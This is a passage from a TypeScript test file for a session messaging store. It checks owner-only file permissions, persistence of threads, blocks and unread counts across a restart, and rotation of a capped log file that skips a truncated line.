    // The messages themselves are in their own file, which only its owner can read, and in no other file.
    const { stat, readdir } = await import('node:fs/promises');
    expect((await stat(path.join(dir, MESSAGE_LOG_FILE))).mode & 0o077).toBe(0);
    for (const name of await readdir(dir)) {
      if (name === MESSAGE_LOG_FILE || (await stat(path.join(dir, name))).isDirectory()) continue;
      expect(await fileText(name), name).not.toContain('5521');
    }
    await start();
  });

  it('messages, where each thread stands and blocks are there again after a restart, and the counts are put right', async () => {
    await stop();
    await start({ messages: { pauseAfter: 2 } });
    const a = fakeSession('a');
    const b = fakeSession('b', { agent: null });
    await switchOn();
    await asOwner('POST', paths.sessionMessages(a.id), { text: 'kept over a restart' });
    await tell(a, b.id, 'one');
    await tell(b, a.id, 'two');
    await asOwner('POST', paths.sessionMessageBlocks(b.id), { sender: `s.${a.id}`, blocked: true });
    await stop();
    await start({ messages: { pauseAfter: 2 } });
    expect(stateOf(a.id).messages).toMatchObject({ unread: 2, paused: 1 });
    const threads = await threadsOf(a.id);
    expect(threads.map((t) => [t.state, t.total])).toEqual([
      ['paused', 2],
      ['open', 1],
    ]);
    expect(threads[0].blocks).toEqual([{ sessionId: b.id, sender: `s.${a.id}` }]);
    expect((await inbox(a)).map((m) => m.text)).toEqual(['kept over a restart', 'two']);
  });

  it('a file that reached its cap is started again with everything that is still current', async () => {
    const log = new FileMessageLog(dir, () => 600);
    const message = (text: string, readAt: string | null = null): MessageLine => ({
      type: 'sent',
      message: { id: newId(), threadId: `owner--s.${newId()}`, from: { kind: 'owner' }, to: { kind: 'session', sessionId: newId(), name: 'a' }, text, replyTo: null, sentAt: new Date().toISOString(), readAt },
    });
    const kept = [message('still unread')];
    await log.append([message('first'), message('second')], () => kept);
    await log.append([message('third, which does not fit')], () => kept);
    expect(await log.read()).toEqual(kept);
    expect(await fileText(`${MESSAGE_LOG_FILE}.1`)).toContain('second');
    // A line cut short is left out, and the next line is still read.
    await writeFile(path.join(dir, MESSAGE_LOG_FILE), `${JSON.stringify(kept[0])}\n{"type":"sent","mess`);
    const again = new FileMessageLog(dir, () => 100_000);
    await again.append([message('after the cut')], () => []);
    expect((await again.read()).map((line) => line.type === 'sent' && line.message.text)).toEqual(['still unread', 'after the cut']);
  });
});
